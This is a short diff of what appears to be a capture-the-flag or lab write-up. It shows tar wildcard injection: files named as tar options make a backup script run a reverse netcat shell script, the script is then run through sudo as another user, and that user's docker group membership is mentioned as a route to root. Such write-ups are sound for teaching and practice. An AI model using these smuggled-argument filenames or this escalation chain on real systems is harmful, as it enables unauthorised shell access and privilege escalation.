@@ -12,4 +12,7 @@ I just created a file with reverse netcat, which will be backuped in this direct
 echo "" > "--checkpoint-action=exec=sh shell.sh"
 echo "" > --checkpoint=1
 
+Running the script as michael
+sudo -u michael /opt/backups/backup.sh 
+
 I opened a netcat session and I then i became michael user, michael is in docker group, and I know how to easy gain a root by this
